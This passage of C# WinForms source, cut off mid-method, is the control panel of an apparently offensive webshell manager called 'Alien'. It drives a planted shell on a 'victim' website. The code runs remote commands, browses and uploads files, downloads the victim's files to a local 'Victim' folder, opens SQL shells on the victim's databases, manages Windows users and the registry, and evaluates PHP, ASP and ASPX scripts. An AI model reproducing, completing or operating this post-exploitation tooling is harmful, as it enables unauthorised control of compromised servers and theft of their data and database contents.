using ICSharpCode.TextEditor;
using ICSharpCode.TextEditor.Actions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Common.CommandTrees;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices.JavaScript;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using System.Xml.Linq;
using Newtonsoft.Json;
using System.Web;
using System.Runtime.InteropServices.Marshalling;
using Newtonsoft.Json.Linq;
using Microsoft.VisualBasic;
using ICSharpCode.TextEditor.Document;
using ICSharpCode.TextEditor.Src.Document.FoldingStrategy;
using System.Globalization;

namespace Alien
{
    public partial class frmControlPanel : Form
    {
        private TabPage draggedTab = null;

        public clsWeb m_web { get; init; }
        public clsVictim m_victim { get { return m_web.m_victim; } }

        public clsInfoSpyder m_infoSpyder { get; init; }
        public clsfnFileMgr m_fileMgr { get; init; }
        public clsfnShell m_rShell { get; set; }
        public clsfnDb m_dbMgr { get; init; }
        public clsfnRunScript m_runScript { get; init; }
        public clsfnWinReg m_winReg { get; init; }
        public clsfnWinUser m_winUser { get; init; }
        public clsfnPlugin m_plugin { get; init; }

        private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
        private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
        private TextEditorControlEx m_ctrlEvalEditor = new TextEditorControlEx();
        private TextEditorControlEx m_ctrlPostEditor = new TextEditorControlEx();

        private Dictionary<enLanguage, Func<string, string>> m_dicEvalScript = new Dictionary<enLanguage, Func<string, string>>()
        {
            {
                enLanguage.PHP,
                (method) =>
                {
                    return "phpinfo();";
                }
            },
            {
                enLanguage.ASP,
                (method) =>
                {
                    return "Response.Write \"ASP\"";
                }
            },
            {
                enLanguage.ASPX,
                (method) =>
                {
                    if (method == "JScript")
                        return "Response.Write(\"JScript ASPX\");";
                    else
                        return "Response.Write(\"CSharp ASP.NET\");";
                }
            }
        };

        private string[] m_asImageExt =
        {
            "png", "jpg", "bmp",
        };
        private bool fnbIsImageFile(string szExtension) => m_asImageExt.Contains(szExtension.Replace(".", string.Empty));

        public frmControlPanel(clsWeb web)
        {
            InitializeComponent();

            m_web = web;

            m_infoSpyder = new clsInfoSpyder(web);
            m_fileMgr = new clsfnFileMgr(web);
            m_rShell = new clsfnShell(web);
            m_runScript = new clsfnRunScript(web);

            m_winReg = new clsfnWinReg(web);
            m_winUser = new clsfnWinUser(web);

            m_plugin = new clsfnPlugin(web);

            m_dbMgr = new clsfnDb(web, "db.sqlite");
        }

        #region Classes

        private class clsDbTablePageControls
        {
            public clsfnDb.stDbConfig m_config { get; init; }
            public TreeNode m_nodeRoot { get; init; }
            public TabPage page { get; init; }

            public ToolStrip toolStrip { get; init; }
            public ListView listView { get; init; }
            public TextBox textBox { get; init; }

            public List<string> m_lsLastTable = new List<string>();

            private ImageList dbListImageList { get; init; }

            public clsDbTablePageControls(clsfnDb.stDbConfig config, TreeNode nodeRoot, TabPage page, ImageList imageList, ContextMenuStrip menuTable)
            {
                m_config = config;
                m_nodeRoot = nodeRoot;

                dbListImageList = new ImageList();
                dbListImageList.ImageSize = new Size(60, 60);
                dbListImageList.ColorDepth = ColorDepth.Depth32Bit;

                foreach (string? szKey in imageList.Images.Keys)
                {
                    if (string.IsNullOrEmpty(szKey))
                        continue;

                    Image? img = imageList.Images[szKey];
                    if (img == null)
                        continue;

                    Image imgNew = clsEzData.fnResizeImage(img, 60, 60);

                    dbListImageList.Images.Add(szKey, imgNew);
                }

                ToolStrip ts = new ToolStrip();
                ListView lv = new ListView();
                TextBox tb = new TextBox();

                this.page = page;
                this.page.Tag = this;

                toolStrip = ts;
                listView = lv;
                textBox = tb;

                ToolStripButton btnRefresh = new ToolStripButton("Refresh");
                btnRefresh.DisplayStyle = ToolStripItemDisplayStyle.Text;

                ToolStripButton btnNew = new ToolStripButton("New");
                btnNew.DisplayStyle = ToolStripItemDisplayStyle.Text;

                ts.Items.AddRange(new ToolStripItem[]
                {
                    btnRefresh,
                    btnNew,
                });
                ts.Font = page.Font;

                page.Controls.Add(ts);
                page.Controls.Add(lv);
                page.Controls.Add(tb);

                ts.Dock = DockStyle.Top;
                lv.Dock = DockStyle.Fill;
                tb.Dock = DockStyle.Bottom;

                tb.SendToBack();
                lv.BringToFront();

                lv.View = View.LargeIcon;
                lv.ContextMenuStrip = menuTable;

                // ImageList
                lv.LargeImageList = dbListImageList;
            }
        }
        private class clsDbSqlResultControls
        {
            private clsfnDb.stDbConfig m_cfg { get; init; }
            private clsfnDb m_dbMgr { get; init; }

            public TextBox textBox { get; init; }
            public DataGridView dataGridView { get; init; }

            public clsDbSqlResultControls(TabPage page, clsfnDb.stDbConfig config, clsfnDb dbMgr)
            {
                m_cfg = config;
                m_dbMgr = dbMgr;

                if (page.Controls.Count > 0)
                {
                    dataGridView = (DataGridView)page.Controls[0];
                    textBox = (TextBox)page.Controls[1];

                    return;
                }

                textBox = new TextBox();
                dataGridView = new DataGridView();

                dataGridView.AllowUserToAddRows = true;
                dataGridView.AllowUserToDeleteRows = true;

                page.Controls.Add(textBox);
                page.Controls.Add(dataGridView);

                dataGridView.BringToFront();

                textBox.Dock = DockStyle.Top;
                dataGridView.Dock = DockStyle.Fill;

                textBox.KeyDown += async (s, e) =>
                {
                    if (e.KeyCode == Keys.Enter)
                    {
                        string szQuery = textBox.Text;
                        DataTable dt = await m_dbMgr.fnSqlQuery(m_cfg, szQuery);

                        dataGridView.DataSource = dt;
                    }
                };
            }
        }
        private class clsDbSqlShellControls
        {
            private clsfnDb.stDbConfig m_config { get; init; }
            private clsfnDb m_dbMgr { get; init; }

            private SplitContainer splitContainer { get; init; }

            public int m_nPromitStart { get; set; }
            public string m_szPrompt { get { return $"{m_config.szSource}({Enum.GetName(typeof(enDatabase), m_config.enDbType)})> "; } }

            public RichTextBox richTextBox { get; init; }
            public ToolStrip toolStrip { get; init; }
            public TextEditorControlEx textEditorControl { get; init; }

            public clsDbSqlShellControls(TabPage page, clsfnDb.stDbConfig config, clsfnDb dbMgr)
            {
                m_config = config;
                m_dbMgr = dbMgr;

                splitContainer = new SplitContainer();
                toolStrip = new ToolStrip();
                richTextBox = new RichTextBox();
                textEditorControl = new TextEditorControlEx();

                page.Controls.Add(splitContainer);
                splitContainer.FixedPanel = FixedPanel.Panel2;
                splitContainer.Panel1.Controls.Add(richTextBox);
                splitContainer.Panel2.Controls.Add(toolStrip);
                splitContainer.Panel2.Controls.Add(textEditorControl);

                splitContainer.Orientation = Orientation.Horizontal;
                splitContainer.Dock = DockStyle.Fill;
                splitContainer.SplitterDistance = 200;

                richTextBox.Font = new Font("Consolas", page.Font.Size);
                richTextBox.BackColor = Color.Black;
                richTextBox.ForeColor = Color.White;
                richTextBox.Dock = DockStyle.Fill;
                richTextBox.WordWrap = false;

                richTextBox.BringToFront();

                textEditorControl.Dock = DockStyle.Fill;
                textEditorControl.BringToFront();

                ToolStripButton btnExec = new ToolStripButton("Execute");

                toolStrip.Items.AddRange(new ToolStripItem[]
                {
                    btnExec,
                });
                toolStrip.Font = page.Font;

                btnExec.Click += async (s, e) =>
                {
                    string szSQL = textEditorControl.Text;
                    if (string.IsNullOrEmpty(szSQL))
                        return;

                    szSQL = m_dbMgr.fnToSingleLineSql(szSQL);

                    DataTable dt = await m_dbMgr.fnSqlQuery(m_config, szSQL);

                    richTextBox.AppendText("\n\nExecute SQL result:\n\n");
                    richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                    richTextBox.AppendText("\n");

                    richTextBox.AppendText(m_szPrompt);
                    richTextBox.ScrollToCaret();
                    m_nPromitStart = richTextBox.TextLength;
                };
            }
        }
        private class clsDbInformation
        {
            public TabPage m_page { get; init; }
            public clsfnDb.stDbConfig m_config { get; init; }

            public RichTextBox richTextBox { get; init; }

            public clsDbInformation(TabPage page, clsfnDb.stDbConfig config)
            {
                m_page = page;
                m_config = config;

                richTextBox = new RichTextBox();

                page.Tag = this;
                page.Controls.Add(richTextBox);

                richTextBox.Dock = DockStyle.Fill;
                richTextBox.BackColor = Color.Black;
                richTextBox.ForeColor = Color.White;
                richTextBox.Font = new Font("Consolas", page.Font.Size);
            }
        }

        #endregion

        async Task<bool> fnbValidator()
        {
            if (!await m_web.fnbTestWebConnection())
            {
                MessageBox.Show("Website connection failed.", "fnbTestWebConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!await m_web.fnbTestShellConnection())
            {
                MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        #region Tool

        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
        {
            if (asName.Length == 0)
                return rootNode;

            foreach (TreeNode node in cNode)
            {
                if (string.Equals(node.Text, asName[0]))
                {
                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
                }
            }

            return null;
        }
        private clsfnFileMgr.stEntry fnFileGetItemTag(ListViewItem item) => (clsfnFileMgr.stEntry)item.Tag;

        private T? fnFindForm<T>() where T : Form
        {
            foreach (Form f in Application.OpenForms)
            {
                if (typeof(T).Name == f.GetType().Name)
                {
                    return (T)f;
                }
            }

            return null;
        }

        private int fnGetTabIndexAt(Point p)
        {
            for (int i = 0; i < tabControl4.TabPages.Count; i++)
            {
                if (tabControl4.GetTabRect(i).Contains(p))
                    return i;
            }
            return -1;
        }

        private Rectangle fnGetCloseRect(int i)
        {
            Rectangle tabRect = tabControl4.GetTabRect(i);

            return new Rectangle(
                tabRect.Right - 20,
                tabRect.Top + 4,
                15,
                15);
        }

        #endregion
        #region Info

        private async Task<string> fnszGetInfo()
        {
            toolStripStatusLabel1.Text = "Loading...";
            string szResp = await m_infoSpyder.fnszGetInfo();
            toolStripStatusLabel1.Text = "Action successfully.";

            return szResp;
        }

        #endregion
        #region FileMgr

        private TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
        {
            List<TreeNode> lNode = new List<TreeNode>();
            foreach (TreeNode node in cNode)
            {
                if (node.Text == szText)
                    lNode.Add(node);
            }

            return lNode.ToArray();
        }

        void fnFileAddPathToTreeView(string szDirPath) => fnFileAddPathToTreeView(szDirPath.Replace("\\", "/").Split('/'));
        void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
        {
            if (asDirPath.Length == 0)
                return;

            string szDir = asDirPath[0];
            TreeNode[] aNode = fnFileFindNodesWithText(node == null ? treeView3.Nodes : node.Nodes, szDir);
            if (aNode.Length == 0)
            {
                TreeNode newNode = new TreeNode(szDir);
                if (node == null)
                    treeView3.Nodes.Add(newNode);
                else
                    node.Nodes.Add(newNode);

                aNode = new TreeNode[] { newNode };
            }

            fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
        }

        public async void fnFileMgrRefresh() => Invoke(new Action(() => fnFileScandir(m_fileMgr.m_szCurrentPath)));

        async void fnFileScandir(string szDir)
        {
            listView2.Items.Clear();

            szDir = szDir.Replace("\r\n", string.Empty).Replace(Environment.NewLine, string.Empty).Trim('\n');
            textBox1.Text = szDir;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                node = fnFindNodeWithFullPath(treeView3.Nodes, szDir.Replace("\\", string.Empty));

            var le = await m_fileMgr.fnleScandir(szDir);
            var leFolder = le.Where(x => x.bIsDirectory).ToList();
            var leFile = le.Where(x => !x.bIsDirectory).ToList();

            // TreeView
            if (node.Nodes.Count > 0)
            {
                List<TreeNode> nodes = node.Nodes.Cast<TreeNode>().ToList();
                var lsFolder = leFolder.Select(x => x.szEntryName);
                foreach (var n in nodes)
                {
                    if (!lsFolder.Contains(n.Text))
                    {
                        treeView3.Nodes.Remove(n);
                    }
                }
            }

            // ListView
            foreach (var entry in leFolder.Concat(leFile))
            {
                ListViewItem item = new ListViewItem(entry.szEntryName);
                item.SubItems.Add(entry.szPriviledge);
                item.SubItems.Add(entry.nSize.ToString());
                item.SubItems.Add(entry.dtCreationDate.ToString("F"));
                item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
                item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));

                string szExtension = entry.szEntryName.Split('.').Last();
                if (!entry.bIsDirectory)
                    m_fileMgr.fnGetExtensionIcon(szExtension);

                item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                item.Tag = entry;

                listView2.Items.Add(item);

                if (node != null && entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
                {
                    TreeNode newNode = new TreeNode(entry.szEntryName);
                    int nIdx = 0;
                    while (
                        node.Nodes.Count > 0
                        && nIdx < node.Nodes.Count
                        && string.Compare(newNode.Text, node.Nodes[nIdx].Text) > 0
                    )
                    {
                        nIdx++;
                    }

                    node.Nodes.Insert(nIdx, newNode);
                }
            }

            node?.Expand();

            toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
        }

        async void fnFileDisplayAllImage()
        {
            List<string> lsImagePath = new List<string>();
            foreach (ListViewItem item in listView2.Items)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsImagePath.Add(entry.szEntryPath);
            }

            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty");
                return;
            }

            await fnFileDisplayImage(lsImagePath);
        }
        async Task fnFileDisplayImage(List<string> lsImagePath)
        {
            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            frmFileImage? f = fnFindForm<frmFileImage>();
            if (f == null)
            {
                f = new frmFileImage(lsImagePath.Count);
                f.Text = "DisplayImage";

                f.Show();
            }
            else
            {
                f.BringToFront();
                f.Focus();
            }

            foreach (string szFilePath in lsImagePath)
            {
                Image img = await m_fileMgr.fnReadImage(szFilePath);
                if (img == null)
                {
                    MessageBox.Show("Failed to read image: " + szFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                f.fnAddImage(szFilePath, img);
            }
        }

        async void fnFileRead(string szFilePath)
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (f == null)
            {
                f = new frmTextEditor();
                f.Owner = this;
                f.Show();
            }

            f.BringToFront();

            string szContent = await m_fileMgr.fnszRead(szFilePath);
            f.fnShowContent(szFilePath, szContent);
        }

        public async Task<bool> fnbFileWrite(string szFilePath, string szContent)
        {
            if (await m_fileMgr.fnbWrite(szFilePath, szContent))
            {
                toolStripStatusLabel1.Text = "Action successfully.";
                return true;
            }
            else
            {
                MessageBox.Show("Write file failed.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        async void fnFileDirExists(string szDirPath)
        {
            szDirPath = await m_fileMgr.fnszCheckPathExists(szDirPath);
            if (string.IsNullOrEmpty(szDirPath))
            {
                textBox1.Text = m_fileMgr.m_szCurrentPath;
                return;
            }

            fnFileAddPathToTreeView(szDirPath);

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDirPath);
            treeView3.SelectedNode = node;
        }

        public async Task<Dictionary<string, bool>> fnFileUpload(List<string> lsSrcFilePath, int nThread = 3, int nChunkSize = 5 * 1024, Action fnOnCallback = null)
        {
            tabControl6.SelectedIndex = 1;

            string szCurrentDir = m_fileMgr.m_szCurrentPath;
            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();

            TreeNode nodeUpload = treeView4.Nodes[0];

            foreach (string szSrcFilePath in lsSrcFilePath)
            {
                long nFileSize = -1;

                if (nFileSize == -1)
                {
                    FileInfo info = new FileInfo(szSrcFilePath);
                    nFileSize = info.Length;
                }

                string szFileName = Path.GetFileName(szSrcFilePath);
                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                node.Tag = 0;
                nodeUpload.Nodes.Add(node);

                dicNode.Add(szSrcFilePath, node);

                nodeUpload.Expand();
            }

            List<Task> lsTask = new List<Task>();
            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
            {
                foreach (string szSrcFilePath in lsSrcFilePath)
                {
                    long nFileSize = -1;

                    string szFileName = Path.GetFileName(szSrcFilePath);
                    string szDstFilePath = Path.Combine(szCurrentDir, szFileName).Replace("\\", "/");

                    if (nFileSize == -1)
                    {
                        FileInfo info = new FileInfo(szSrcFilePath);
                        nFileSize = info.Length;
                    }

                    long nProgress = 0;

                    TreeNode node = dicNode[szSrcFilePath];
                    node.Tag = nProgress;

                    Action act = () =>
                    {
                        Invoke(new Action(() =>
                        {
                            nProgress = (long)node.Tag;
                            nProgress += nChunkSize;
                            node.Tag = nProgress;

                            string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
                            node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";

                            if (nProgress >= nFileSize)
                            {
                                nodeUpload.Nodes.Remove(node);
                            }
                        }));
                    };

                    lsTask.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync();

                        try
                        {
                            bool bRet = await m_fileMgr.fnbFileUpload(szSrcFilePath, szDstFilePath, nChunkSize, act, fnOnCallback);
                            dicState[szFileName] = bRet;

                            Invoke(new Action(() =>
                            {
                                if (dicNode.ContainsKey(szSrcFilePath))
                                    dicNode.Remove(szSrcFilePath);
                            }));
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));

                    await Task.WhenAll(lsTask);
                }
            }

            return dicState;
        }

        public async Task<(Dictionary<string, bool> dicState, string szSaveDirPath)> fnFileDownload(List<(string, long)> lsRemoteFile, int nThread = 3, int nChunkSize = 5 * 1024, Action fnCallback = null)
        {
            string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
            if (!Directory.Exists(szLocalSaveDirPath))
                Directory.CreateDirectory(szLocalSaveDirPath);

            List<string> lsRemoteFilePath = lsRemoteFile.Select(x => x.Item1).ToList();
            lsRemoteFilePath = lsRemoteFilePath.Select(x => x.Replace("\\", "/")).ToList();

            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();
            TreeNode nodeDownload = treeView4.Nodes[1];

            for (int i = 0; i < lsRemoteFilePath.Count; i++)
            {
                string szRemoteFilePath = lsRemoteFilePath[i];
                long nFileSize = lsRemoteFile[i].Item2; // bytes

                string szFileName = Path.GetFileName(szRemoteFilePath);

                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                node.Tag = 0;
                nodeDownload.Nodes.Add(node);

                dicNode.Add(szRemoteFilePath, node);

                nodeDownload.Expand();
            }

            List<Task> lsTask = new List<Task>();
            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
            {
                for (int i = 0; i < lsRemoteFile.Count; i++)
                {
                    string szRemoteFilePath = lsRemoteFilePath[i];
                    string szFileName = Path.GetFileName(szRemoteFilePath);
                    string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);

                    long nFileSize = -1;
                    long nProgress = 0;

                    TreeNode node = dicNode[szRemoteFilePath];
                    node.Tag = nProgress;

                    if (nFileSize == -1)
                        nFileSize = lsRemoteFile[i].Item2;

                    Action act = () =>
                    {
                        Invoke(new Action(() =>
                        {
                            nProgress = (long)node.Tag;
                            nProgress += nChunkSize;
                            node.Tag = nProgress;

                            string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
                            node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";

                            if (nProgress >= nFileSize)
                            {
                                nodeDownload.Nodes.Remove(node);
                            }
                        }));
                    };

                    lsTask.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync();

                        try
                        {
                            bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath, nChunkSize, act, fnCallback);
                            dicState[szRemoteFilePath] = bRet;

                            Invoke(new Action(() =>
                            {
                                if (dicNode.ContainsKey(szRemoteFilePath))
                                    dicNode.Remove(szRemoteFilePath);
                            }));
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));

                    await Task.WhenAll(lsTask);
                }
            }

            return (dicState, szLocalSaveDirPath);
        }

        public async void fnFileNewFolder()
        {

        }

        public void fnFileNewFile()
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (null == f)
            {
                f = new frmTextEditor();
                f.Owner = this;
                f.Show();
            }

            f.BringToFront();

            string szFileName = clsTool.fnszGenerateFileNameWithDateTime("txt");
            string szFilePath = Path.Combine(m_fileMgr.m_szCurrentPath, szFileName).Replace("\\", "/");
            f.fnShowContent(szFilePath, string.Empty);
        }

        public async Task<bool> fnbFileDelete(string szDstEntry)
        {
            return await m_fileMgr.fnbDelete(szDstEntry);
        }
        public async Task<bool> fnbFileDelete(clsfnFileMgr.stEntry entry) => await fnbFileDelete((entry.bIsDirectory ? entry.szEntryPath + "/" : entry.szEntryPath).Replace("\\", "/"));

        #endregion
        #region Shell

        async void fnShellInit()
        {
            richTextBox1.BackColor = Color.Black;
            richTextBox1.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;
            richTextBox1.Font = new Font("Consolas", Font.Size);

            string szCommand = m_victim.m_bUnixLike ? "uname -a" : "ver";
            await fnShellExecute(szCommand);

            string szInitCommand = $"netstat -ano | {(m_victim.m_bUnixLike ? "grep" : "find")} \"ESTABLISHED\"";
            richTextBox1.AppendText(szInitCommand);
        }

        async Task fnShellExecute(string szCommand)
        {
            var ret = await m_rShell.fnShellExecute(szCommand);
            string[] asOutput = ret.szOutput.Replace("\r\n", "\n").Split('\n');

            richTextBox1.AppendText(string.Join(Environment.NewLine, asOutput));
            richTextBox1.AppendText(Environment.NewLine);

            ret.szCurrentDir = ret.szCurrentDir.Replace("\r\n", "\n").Replace("\n", string.Empty);

            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$ " : $"{ret.szCurrentDir}> ")}";
            richTextBox1.AppendText(szPrompt);
            richTextBox1.Focus();

            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.SelectionLength = 0;

            richTextBox1.Tag = richTextBox1.Text.Length;
        }

        #endregion
        #region Database

        public async void fnDbInit()
        {
            // UI init

            toolStripLabel1.Text = "Loading...";

            treeView2.Nodes.Clear();
            listView4.Items.Clear();
            foreach (TabPage tab in tabControl4.TabPages)
                tabControl4.TabPages.Remove(tab);

            // Scan available modules.
            var lsDb = await m_dbMgr.fnDbInit();
            foreach (var module in lsDb)
            {
                ListViewItem item = new ListViewItem(module.Item1);
                item.SubItems.Add(module.Item2 ? "YES" : "NO");

                listView4.Items.Add(item);
            }

            // Load database config from *.sqlite file.
            var ls = m_dbMgr.fnGetAllDbConfig();
            foreach (var db in ls)
            {
                TreeNode node = new TreeNode(db.szSource);
                node.Tag = db;

                string? szDb = Enum.GetName(typeof(enDatabase), db.enDbType);
                if (string.IsNullOrEmpty(szDb))
                    continue;

                node.ImageKey = szDb.ToLower();
                node.SelectedImageKey = node.ImageKey;

                treeView2.Nodes.Add(node);
            }

            toolStripLabel1.Text = $"Database[{treeView2.Nodes.Count}]";
        }

        void fnDbShowTablePage(TreeNode nodeSelected, string szHost, string szDbName, List<string> lsTable)
        {
            TabPage page = new TabPage($"Table[{szHost}] - {szDbName}");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            var config = (clsfnDb.stDbConfig)nodeSelected.Parent.Tag;

            clsDbTablePageControls ctrls = new clsDbTablePageControls(config, nodeSelected, page, dbImageList, menuDbTable);
            ctrls.listView.DoubleClick += async (s, e) =>
            {
                if (ctrls.listView.SelectedItems.Count == 0)
                    return;

                ListViewItem item = ctrls.listView.SelectedItems[0];
                string szTable = item.Text;

                string szQuery = $"SELECT * FROM `{szDbName}`.`{szTable}` LIMIT 100;";
                var config = m_dbMgr.m_stDbConfig[szHost];
                DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

                fnDbShowData(config, dt, szQuery);
            };
            ctrls.textBox.KeyDown += (s, e) =>
            {
                Task.Run(() =>
                {
                    List<string> lsMatched = ctrls.m_lsLastTable.Where(x => x.Contains(ctrls.textBox.Text, StringComparison.OrdinalIgnoreCase)).ToList();
                    Invoke(() =>
                    {
                        ctrls.listView.Clear();

                        foreach (var table in lsMatched)
                        {
                            ListViewItem item = new ListViewItem(table);
                            item.ImageKey = "table";

                            ctrls.listView.Items.Add(item);
                        }
                    });
                });
            };

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            // Show tables
            if (ctrls.m_lsLastTable.Count > 0)
                ctrls.m_lsLastTable.Clear();

            List<string> lsExistedTable = nodeSelected.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();

            foreach (string szTable in lsTable)
            {
                if (ctrls.listView.FindItemWithText(szTable) == null)
                {
                    ListViewItem item = new ListViewItem(szTable);
                    item.ImageKey = "table";

                    ctrls.listView.Items.Add(item);
                }

                string szNodePath = $"{szHost}\\{szDbName}\\{szTable}";
                if (fnFindNodeWithFullPath(nodeSelected.Nodes, szNodePath) == null)
                {
                    if (lsExistedTable.Contains(szTable))
                        continue;

                    TreeNode node = new TreeNode(szTable);
                    node.ImageKey = "table";
                    node.SelectedImageKey = node.ImageKey;

                    nodeSelected.Nodes.Add(node);
                }

                ctrls.m_lsLastTable.Add(szTable);
            }

            nodeSelected.Expand();
        }

        void fnDbShowData(clsfnDb.stDbConfig config, DataTable data, string szQuery)
        {
            TabPage page = new TabPage($"Result[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbSqlResultControls ctrls = new clsDbSqlResultControls(page, config, m_dbMgr);
            ctrls.textBox.Text = szQuery;
            ctrls.dataGridView.DataSource = data;
        }

        void fnDbShowSqlQuery(clsfnDb.stDbConfig config, string szDbName)
        {
            TabPage page = new TabPage($"SQL[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbSqlShellControls ctrls = new clsDbSqlShellControls(page, config, m_dbMgr);
            ctrls.richTextBox.AppendText("SQL Shell\n\n");
            ctrls.richTextBox.AppendText(ctrls.m_szPrompt);
            ctrls.richTextBox.SelectionStart = ctrls.richTextBox.Text.Length;
            ctrls.m_nPromitStart = ctrls.richTextBox.Text.Length;
            ctrls.richTextBox.KeyDown += async (s, e) =>
            {
                int nPrompt = ctrls.m_nPromitStart;

                if (e.KeyCode == Keys.Enter)
                {
                    e.SuppressKeyPress = true;

                    string szCmd = ctrls.richTextBox.Text.Substring(nPrompt);

                    ctrls.richTextBox.AppendText("\n\n");

                    DataTable dt = await m_dbMgr.fnSqlQuery(config, szCmd);

                    if (dt != null)
                    {
                        ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                        ctrls.richTextBox.AppendText("\n");
                    }

                    ctrls.richTextBox.AppendText(ctrls.m_szPrompt);
                    ctrls.richTextBox.ScrollToCaret();

                    ctrls.m_nPromitStart = ctrls.richTextBox.TextLength;

                    return;
                }

                if (e.KeyCode == Keys.Back && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode == Keys.Delete && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.Control && e.KeyCode == Keys.V && ctrls.richTextBox.SelectionStart < nPrompt)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            };
            ctrls.richTextBox.KeyPress += (s, e) =>
            {
                int nPrompt = ctrls.m_nPromitStart;
                if (ctrls.richTextBox.SelectionStart < nPrompt)
                {
                    e.Handled = true;
                };
            };
        }

        async void fnDbShowInformation(clsfnDb.stDbConfig config)
        {
            TabPage page = new TabPage($"Info[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbInformation ctrls = new clsDbInformation(page, config);

            DataTable dt = await m_dbMgr.fnDbInfo(config);
            DataTable dtNew = new DataTable();

            dtNew.Columns.Add("Field");
            dtNew.Columns.Add("Value");

            for (int i = 0; i < dt.Columns.Count; i++)
            {
                DataColumn dc = dt.Columns[i];
                DataRow dr = dt.Rows[0];

                dtNew.Rows.Add(dc.ColumnName, dr[i]);
            }

            ctrls.richTextBox.Clear();
            ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dtNew));
        }

        #endregion
        #region Linux

        #endregion
        #region Windows

        #region Users

        async Task fnWinUserInit()
        {
            void fnLoadWmiToListView(ListView listView, List<clsfnWinUser.WmiRow> data)
            {
                if (listView == null || data == null || data.Count == 0)
                    return;

                listView.BeginUpdate();

                listView.Clear();
                listView.View = View.Details;
